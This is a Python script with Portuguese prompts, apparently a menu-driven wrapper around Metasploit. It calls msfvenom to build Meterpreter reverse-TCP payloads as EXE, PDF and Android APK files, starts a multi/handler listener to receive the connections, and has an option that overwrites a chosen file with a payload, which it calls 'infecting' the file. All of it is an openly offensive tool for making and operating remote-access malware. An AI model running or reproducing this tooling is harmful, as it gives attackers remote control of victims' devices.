import subprocess
import socket
import os

def get_local_ip():
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.settimeout(0.1)
        s.connect(("8.8.8.8", 80))
        local_ip = s.getsockname()[0]
        s.close()
        return local_ip
    except Exception:
        return "127.0.0.1"

def is_file_in_msf4(file_path):
    msf4_dir = os.path.expanduser("~/.msf4/modules/")
    return file_path.startswith(msf4_dir)

def list_msf4_modules():
    msf4_dir = os.path.expanduser("~/.msf4/modules/")
    if os.path.exists(msf4_dir):
        print("Módulos disponíveis no diretório .msf4:")
        module_list = []
        for root, dirs, files in os.walk(msf4_dir):
            for file in files:
                if file.endswith(".rb"):
                    module_list.append(os.path.join(root, file))
        if module_list:
            for module in module_list:
                print(module)
        else:
            print("Nenhum módulo encontrado no diretório .msf4.")
        return module_list
    else:
        print("Diretório .msf4 não encontrado.")
        return []

def search_modules(query, module_list):
    matching_modules = [module for module in module_list if query in module]
    if matching_modules:
        print("Módulos correspondentes:")
        for module in matching_modules:
            print(module)
    else:
        print("Nenhum módulo correspondente encontrado.")

def generate_payload(payload_type, lhost, lport):
    if payload_type == "exe":
        print("Gerando payload para EXE...")
        cmd = ["msfvenom", "-p", "windows/meterpreter/reverse_tcp", f"LHOST={lhost}", f"LPORT={lport}", "-f", "exe", "-o", "payload.exe"]
        print("Comando usado para gerar o payload:")
        print(" ".join(cmd))
        try:
            subprocess.call(cmd)
            print("Payload gerado com sucesso.")
        except Exception as e:
            print(f"Erro ao gerar payload: {str(e)}")
    elif payload_type == "pdf":
        print("Gerando payload para PDF...")
        cmd = ["msfvenom", "-p", "windows/meterpreter/reverse_tcp", f"LHOST={lhost}", f"LPORT={lport}", "-f", "pdf", "-o", "payload.pdf"]
        print("Comando usado para gerar o payload:")
        print(" ".join(cmd))
        try:
            subprocess.call(cmd)
            print("Payload gerado com sucesso.")
        except Exception as e:
            print(f"Erro ao gerar payload: {str(e)}")
    elif payload_type == "apk":
        print("Gerando payload para APK...")
        cmd = ["msfvenom", "-p", "android/meterpreter/reverse_tcp", f"LHOST={lhost}", f"LPORT={lport}", "-o", "payload.apk"]
        print("Comando usado para gerar o payload:")
        print(" ".join(cmd))
        try:
            subprocess.call(cmd)
            print("Payload gerado com sucesso.")
        except Exception as e:
            print(f"Erro ao gerar payload: {str(e)}")
    else:
        print("Tipo de payload não suportado.")

def start_listener(lhost, lport):
    print(f"Iniciando listener em {lhost}:{lport}...")
    cmd = f"use multi/handler; set PAYLOAD windows/meterpreter/reverse_tcp; set LHOST {lhost}; set LPORT {lport}; exploit"
    print("Comando usado para iniciar o listener:")
    print(cmd)
    try:
        subprocess.call(["msfconsole", "-q", "-x", cmd])
    except Exception as e:
        print(f"Erro ao iniciar o listener: {str(e)}")

def infect_existing_file(file_path, lhost, lport):
    if not is_file_in_msf4(file_path):
        print("O arquivo não está no repositório .msf4. Certifique-se de que o arquivo seja um módulo válido.")
        return

    print(f"Infectando o arquivo {file_path} com payload para {lhost}:{lport}...")
    cmd = ["msfvenom", "-p", "windows/meterpreter/reverse_tcp", f"LHOST={lhost}", f"LPORT={lport}", "-f", "exe", "-o", file_path]
    print("Comando usado para infectar o arquivo:")
    print(" ".join(cmd))
    try:
        subprocess.call(cmd)
        print(f"Arquivo {file_path}
infectado com sucesso.")
    except Exception as e:
        print(f"Erro ao infectar o arquivo: {str(e)}")

def main():
    local_ip = get_local_ip()
    print(f"Seu endereço IP local é: {local_ip}")
    while True:
        print("Bem-vindo ao seu script de geração de payload e listener.")
        print("Selecione a opção desejada:")
        print("1. Gerar payload")
        print("2. Iniciar listener")
        print("3. Listar módulos no .msf4")
        print("4. Pesquisar módulos no .msf4")
        print("5. Infectar arquivo existente")
        print("6. Sair")

        option = input("Escolha uma opção (1/2/3/4/5/6): ")

        if option == "1":
            payload_type = input("Escolha o tipo de payload (pdf/exe/apk): ")
            lhost = input(f"Insira o LHOST (padrão: {local_ip}): ") or local_ip
            lport = input("Insira o LPORT: ")
            generate_payload(payload_type, lhost, lport)
        elif option == "2":
            lhost = input(f"Insira o LHOST (padrão: {local_ip}): ") or local_ip
            lport = input("Insira o LPORT: ")
            start_listener(lhost, lport)
        elif option == "3":
            module_list = list_msf4_modules()
        elif option == "4":
            if "module_list" in locals():
                query = input("Digite o nome do módulo que deseja pesquisar: ")
                search_modules(query, module_list)
            else:
                print("Primeiro liste os módulos no diretório .msf4 (opção 3).")
        elif option == "5":
            file_path = input("Insira o caminho do arquivo a ser infectado: ")
            lhost = input(f"Insira o LHOST (padrão: {local_ip}): ") or local_ip
            lport = input("Insira o LPORT: ")
            infect_existing_file(file_path, lhost, lport)
        elif option == "6":
            print("Encerrando o programa.")
            break
        else:
            print("Opção inválida. Tente novamente.")

if __name__ == "__main__":
    main()